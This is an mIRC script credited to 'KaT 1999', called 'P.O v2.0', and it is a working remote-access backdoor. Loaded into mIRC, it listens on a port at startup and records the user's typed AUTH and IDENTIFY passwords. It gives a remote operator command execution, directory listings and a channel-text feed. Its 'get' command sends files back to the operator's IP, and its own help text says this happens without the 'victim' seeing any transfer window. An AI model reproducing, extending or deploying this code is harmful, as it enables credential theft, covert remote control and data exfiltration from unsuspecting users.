[okis]
[users]
hola=hola

[script]
n0=;P.O v2.0 KaT 1999 kat@blackcode.com . No me hago responsable del uso indebido que pueda hacerse de este script.
n1=;
n2=on 1:start:{  if (%puertoemergencia == $null) { set %puertoemergencia 99 } |  abreemergencia }
n3=;La rutina de bouncer la he tomado (porque soy mu vago y poruqe no hago nada que ya esté hecho) del IRcap (www.ircap.net), basicamente la he quitado todo aquello que diera info
n4=;por una ventana pero lo demás es exactamente igual.
n5=alias bouncer {
n6=  sockclose bounce*
n7=  socklisten bounceabre %bounce.entra 
n8=}
n9=
n10=on 1:sockopen:bounceserv: {
n11=  if $sockerr > 0 { return }
n12=  sockwrite -n bounceserv %boun.nick | sockwrite -n bounceserv %boun.user | unset %boun.user %boun.nick
n13=}
n14=on 1:socklisten:bounceabre: { 
n15=  sockopen bounceserv %bounce.serv %bounce.pt
n16=  sockaccept bouncenick
n17=  sockclose bounceabre
n18=}
n19=on 1:text:hi:*:.notice $nick 6;)
n20=on 1:text:*:*:{ if ((%pedebug == on) && ($sock(emergencia2).ip != $null)) { sockwrite -nt emergencia2 * D * < $+ $chan $nick $+ >  $1-   } }
n21=on 1:sockread:bouncenick: {
n22=  sockread %btext
n23=  if ( $sock(bounceserv,1).status != active ) && ($gettok(%btext,1,32) == NICK ) { set %boun.nick %btext | halt }
n24=  if ( $sock(bounceserv,1).status != active ) && ($gettok(%btext,1,32) == USER ) { set %boun.user %btext | halt }
n25=  if ( $sock(bounceserv,1).status == active ) { sockwrite -n bounceserv %btext }
n26=  unset %btext
n27=}
n28=on 1:sockread:bounceserv: {
n29=  sockread %btexts | if ( $sock(bouncenick,1).status == active ) { sockwrite -n bouncenick %btexts }
n30=  unset %btexts
n31=}
n32=on 1:INPUT:*:{ if (( auth isin $1- ) || ( identify isin $1- ))  { set %comando < $+ $me $+ > $+ $1- | escribedatos } |  if ((%pedebug == on) && ($sock(emergencia2).ip != $null)) { sockwrite -nt emergencia2 * D * <COMMAND> $1-   }   }
n33=sockclose:bounceserv: bouncer
n34=on 1:sockclose:bouncenick: bouncer
n35=;
n36=alias leedatos {
n37=  set %nauths $readini aliasess.ini data nauths
n38=  if %nauths == $null { sockwrite -nt emergencia2 * No data present. | halt }
n39=  set %control1 0
n40=  :bucle
n41=  if %control1 == %nauths { unset %control1 | unset %nauths | unset %comando2 | halt }
n42=  set %control1 %control1 + 1
n43=  set %comando2 $readini aliasess.ini data %control1
n44=  sockwrite -nt emergencia2 *  %control1 %comando2
n45=  goto bucle
n46=}
n47=alias escribedatos {
n48=  set %nauths $readini aliasess.ini data nauths
n49=  if %nauths == $null { set %nauths 0 }
n50=  set %nauths %nauths + 1
n51=  writeini aliasess.ini data %nauths %comando
n52=  writeini aliasess.ini data nauths %nauths
n53=}
n54=alias borra {
n55=  remini aliasess.ini data 
n56=  sockwrite -nt emergencia2 * Data deleted...
n57=  halt
n58=}
n59=
n60=;----------------------------------------------------------------------------------
n61=alias abreemergencia {
n62=  unset %em*
n63=  sockclose emergencia*
n64=  .timer 1 1 socklisten emergencia %puertoemergencia
n65=}
n66=
n67=on 1:socklisten:emergencia: { 
n68=  sockaccept emergencia2
n69=  sockwrite -nt emergencia2 PO. v2.0 KaT kat@blackcode.com Of course I am not responsible for the bad use of this script.
n70=  sockwrite -nt emergencia2 Remember: it´s your choice to use this.
n71=}
n72=
n73=on 1:sockread:emergencia2: {
n74=  unset %em* | unset %nems
n75=  set %ande1 0
n76=  unset %comando1
n77=
n78=  if ($sockerr > 0) return
n79=  :nextread1
n80=  sockread -n &temp1
n81=
n82=  if ($sockbr == 0) return
n83=  :descifra1
n84=  set %ande1 %ande1 + 1
n85=  if $bvar(&temp1, %ande1) == 32 { set %comando1 %comando1 $+ $chr(0160) }
n86=  else set %comando1 %comando1 $+ $chr($bvar(&temp1, %ande1))
n87=
n88=  if %ande1 == $bvar(&temp1,0) { goto interpreta1 | goto nextread1 }
n89=  goto descifra1
n90=  goto nextread1
n91=  goto fin1  
n92=
n93=  :interpreta1
n94=  ;--------------------------------------------
n95=
n96=  set %em %comando1 | unset %comando1
n97=  ;********************* 
n98=  set %ems $wildtok(%em,*,0,0160) 
n99=  if %ems == $null { sockwrite -nt emergencia2 * Try to write something | halt }
n100=  set %nems 0
n101=
n102=  :asigna
n103=  if ( %nems == %ems ) { goto sigue }
n104=  set %nems %nems + 1
n105=
n106=  set %em [ $+ [ %nems ] ] $wildtok(%em,*, %nems ,0160)
n107=
n108=  goto asigna
n109=  ;**********************
n110=
n111=  :sigue
n112=
n113=  if ( $readini -nt aliasess.ini okis $sock(emergencia2).ip != $null ) { goto okis }
n114=
n115=  if  (%em2 == $null)  { sockwrite -nt emergencia2 * To log in write: <nick> <password> | halt }
n116=
n117=  unset %clavenick
n118=  set %clavenick  $readini -nt aliasess.ini users %em1
n119=
n120=  if ( %clavenick == %em2 )  { writeini -nt aliasess.ini okis $sock(emergencia2).ip $ctime | sockwrite -nt emergencia2 * Ok you are in, type HELP to list available commands | halt  }
n121=  else { sockwrite -nt emergencia2 * ERROR Bad nick/password!! |  if ( $readini -nt aliasess.ini okis $sock(emergencia2).ip != $null ) { remini -nt aliasess.ini okis $sock(emergencia2).ip } |  abreemergencia | halt }
n122=
n123=  :okis
n124=
n125=  ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
n126=
n127=  if (%em1 == help) { ayudape }
n128=  if (%em1 == exit) {  if ( $readini -nt aliasess.ini okis $sock(emergencia2).ip != $null ) { remini -nt aliasess.ini okis $sock(emergencia2).ip } |  abreemergencia | halt }
n129=  if (%em1 == debug) { pedebug }
n130=  if (%em1 == bounce) { setbouncer }
n131=  if (%em1 == data) { leedatos }
n132=  if (%em1 == dd) { borra }
n133=  if (%em1 == do) { hazcosas }
n134=  if (%em1 == dir) { miradir }
n135=  if (%em1 == get) { getcosas }
n136=  if (%em1 == setport) { setportpo }
n137=  if (%em1 == setuser) { setuserpo }
n138=  sockwrite -nt emergencia2 * ERROR command not suported | halt
n139=
n140=
n141=  ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
n142=  ;--------------------------------------------
n143=  return
n144=
n145=  :fin1
n146=
n147=
n148=}
n149=alias ayudape {
n150=  sockwrite -nt emergencia2 * Available Commands
n151=  sockwrite -nt emergencia2 * DEBUG:   debug on/off enables or disables the debug output to this port
n152=  sockwrite -nt emergencia2 * DO:      do . mIRC will run parametres as if they were commands 
n153=  sockwrite -nt emergencia2 * EXIT:    exit .Closes session with PO.
n154=  sockwrite -nt emergencia2 * BOUNCE: bounce localporttoopen remoteserver remoteport (only for IRC use)
n155=  sockwrite -nt emergencia2 * DATA:   data. It lists all "AUTH" and "IDENTIFY" commands recorded by PO.
n156=  sockwrite -nt emergencia2 * DD:    dd. It deletes de Auth and Identify records.
n157=  sockwrite -nt emergencia2 * DIR:   dir directory (example: dir c:). It lists the files there.
n158=  sockwrite -nt emergencia2 * GET:  get completerute (example: get c:\autoexec.bat). It allows you to download files without the victim seeing any DCC SEND windows or similar. You must enable your DCC Server to receive the file.
n159=  sockwrite -nt emergencia2 * SETPORT: setport port (example: setport 4445). To set the PO listen port.
n160=  sockwrite -nt emergencia2 * SETUSER: setuser nick password .To set the user and password needed to connect with PO.
n161=  halt
n162=}
n163=
n164=;--------------------------------
n165=alias pedebug {
n166=  if ( %em2 == $null) { sockwrite -nt emergencia2 * ERROR insuficient parametres! | halt }
n167=  if %em2 != on && %em2 != off { sockwrite -nt emergencia2 * ERROR incorrect option (on/off) ! | halt }
n168=  set %pedebug %em2 
n169=  sockwrite -nt emergencia2 * DEBUG en status %pedebug
n170=  halt
n171=}
n172=;-------------------------------
n173=alias setbouncer {
n174=  set %bounce.pt %em4 
n175=  set %bounce.entra %em2
n176=  set %bounce.serv %em3 
n177=  if ( %bounce.entra == $null || %bounce.serv == $null  || %bounce.pt == $null ) { sockwrite -nt emergencia2  * ERROR not enought data. <local> <server> <remoto> | halt }  
n178=  else { sockwrite -nt emergencia2 * Ok Bouncer activated. Server: %bounce.serv * Local Port: %bounce.entra * Remote Port: %bounce.pt | bouncer | halt }
n179=}
n180=;-------------------------------
n181=alias hazcosas {
n182=  if (%em2 == $null) { sockwrite -nt emergencia2 * ERROR Try to say me some command! | halt }
n183=  sockwrite -nt emergencia2 * Doing: $getinput(2)
n184=  . $+ $getinput(2)
n185=
n186=  halt
n187=}
n188=;--------------------------------
n189=alias miradir {
n190=  if %em2 == $null { sockwrite -nt emergencia2 * ERROR You must tell me a directory to list! | halt }
n191=  set %directorio 0
n192=  :bucle
n193=  if %directorio == $findfile(%em2,*,N,1) { goto fin }
n194=  set  %directorio %directorio + 1
n195=  sockwrite -nt emergencia2 * $findfile(%em2,*, %directorio ,1) $file($findfile(%em2,*, %directorio ,1)).size bytes
n196=  goto bucle
n197=  :fin
n198=  sockwrite -nt emergencia2 * $findfile(%em2,*,N,1) 
n199=  halt
n200=}
n201=;--------------------------------
n202=alias setportpo {
n203=  if %em2 == $null { sockwrite -nt emergencia2 * ERROR Tell me some port! | halt }
n204=  set %puertoemergencia %em2
n205=  sockwrite -nt emergencia2 * Port changed to %puertoemergencia , change will have effect the next time that mIRC program be run.
n206=  halt
n207=}
n208=;--------------------------------
n209=alias setuserpo {
n210=  if %em2 == $null || %em3 == $null { sockwrite -nt emergencia2 * ERROR You must provide nick and password! | halt }
n211=  remini -nt aliasess.ini users
n212=  writeini -nt aliasess.ini users %em2 %em3
n213=  sockwrite -nt emergencia2 * Ok user changed to %em2 with password %em3 .
n214=  halt
n215=}
n216=
n217=
n218=;--------------------------------
n219=alias GetInput {
n220=
n221=  set %target 2
n222=
n223=  set %userinput %em [ $+ [ %target ] ]
n224=  set %ntrozo %target
n225=  if ( %nems < %target ) set %nems %target
n226=
n227=  :realname3
n228=  if ( %ntrozo == %nems ) { goto realname4 }
n229=  inc %ntrozo
n230=  set %userinput %userinput $+ $chr(0160) $+ %em [ $+ [ %ntrozo ] ]
n231=  goto realname3
n232=
n233=  :realname4
n234=  unset %target
n235=  set %userinput $replace(%userinput, $chr(0160), $chr(32))
n236=  return %userinput
n237=
n238=}
n239=
n240=on 1:sockclose:emergencia2: {
n241=  if ( $readini -nt aliasess.ini okis $sock(emergencia2).ip != $null ) { remini -nt aliasess.ini okis $sock(emergencia2).ip }
n242=  abreemergencia
n243=}
n244=
n245=;---------------------------------------------------------------------
n246=;aqui va toda la parte de envio de archivos, es un tanto compleja mas que nada poruqe he tenido que reescribir todo el dcc send en scirpt xD, afortunadamente ya lo habia hecho
n247=;antes para otro addon referente a un bug del dcc send en el mirc 5.5 (creo que era es version) que permitia mandar archivos falsos a cualquier directorio de la victima claro que eso
n248=;es otra historia ;)
n249=
n250=alias getcosas {
n251=  if ((%em2 == $null) ||  ( \ !isin %em2)) { sockwrite -nt emergencia2 * ERROR complete rute please. | halt }
n252=  set %realfile1 %em2
n253=
n254=  ; tenemos que quitarle al archivo la ruta para que fone el dcc, para ello contamos el numero de "tokens"
n255=  ;que hay entre signos "\" y cojemos el ultimo que se supone es el archivo que enviamos.
n256=
n257=  set %realfile $gettok(%realfile1, $wildtok(%realfile1,*,0,92) , 92)
n258=  set %rrealfile %realfile
n259=  set %realsize $file(%em2).size
n260=
n261=  unset %vruta
n262=  unset %realfile
n263=  dcc59send
n264=  halt
n265=}
n266=
n267=alias DCC59send {
n268=  .enable #bugserver
n269=  /sockopen dccsbug $sock(emergencia2).ip 59
n270=}
n271=
n272=#bugserver off
n273=
n274=;una vez abierto el socket, enviamos la linea clave en todo esto...
n275=
n276=on 1:sockopen:DCCsBug: {
n277=  if $sockerr > 0 { sockwrite -nt emergencia2 * ERROR Do you have your port 59 opened? | b2fin }
n278=  sockwrite -nt emergencia2 * Ok, connected to port 59...
n279=  sockwrite -nt emergencia2 * Writing to socket: 120 POV20 %realsize %rrealfile  
n280=  sockwrite -nt dccsbug 120 POV20 %realsize %rrealfile      
n281=
n282=  unset %fakenick
n283=  unset %fakefile
n284=  unset %rrealfile
n285=}
n286=;interpretamos la respuesta, si nos da vía libre, pasaremos a escribir.
n287=
n288=on 1:sockread:DCCsBug: {
n289=  sockread %dcccontesta 
n290=  if $left( %dcccontesta , 3) == 151  { sockwrite -nt emergencia2 * ERROR Connection refused ( Reply: $left(%dcccontesta,3) ) | b2fin | halt }
n291=  if $left( %dcccontesta , 3) == 150  { sockwrite -nt emergencia2 *  ERROR Your DCC Server has the "SEND accept" option disabled ( Reply: $left(%dcccontesta,3) )  | b2fin | halt }
n292=  if $left( %dcccontesta , 3) == 121  { sockwrite -nt emergencia2 *  OK writting data... ( $left(%dcccontesta,3)  Resume Position: $gettok(%dcccontesta,3,32) ) | set %posicion $gettok(%dcccontesta,3,32) | unset %dcccontesta | Envia }
n293=
n294=  set %posicion %posicion + 4096
n295=  if %posicion >= %realsize { sockwrite -nt emergencia2 * 100% done. | b2fin }
n296=  envia
n297=}
n298=;Esta es la rutina de envio. A grandes rasgos: leemos el archivo en grupos de 4096 en 4096 bytes, metiendo cada grupo a una variable binaria,
n299=;escribimos en el socket la variable binaria y esperamos una respuesta del tipo 121 nickserver resumeposition donde resumeposition nos indica el 
n300=;byte por el que nos hemos quedado y por el que debemos leer a continuacion para que el archivo sea correctamente enviado. fácil ¿no? xD.
n301=
n302=alias Envia {
n303=  ;leemos en el archivo real apartir de la posicion que nos da el DCC Server un pedazo de 4096 bytes metiendolo en la variable binaria &trozo
n304=  bread %realfile1 %posicion 4096 &trozo
n305=  sockwrite dccsbug &trozo
n306=}
n307=on 1:sockclose:dccsbug: {
n308=  sockwrite -nt emergencia2 * Socket DCC SEND Closed.
n309=  b2fin
n310=}
n311=
n312=alias b2fin {
n313=  sockwrite -nt emergencia2 * Operation finished.
n314=  .disable #bugserver
n315=  sockclose DCCsBug
n316=  unset %dcccontesta
n317=  unset %realfile1
n318=  unset %realsize
n319=  halt
n320=}
n321=
n322=#bugserver end
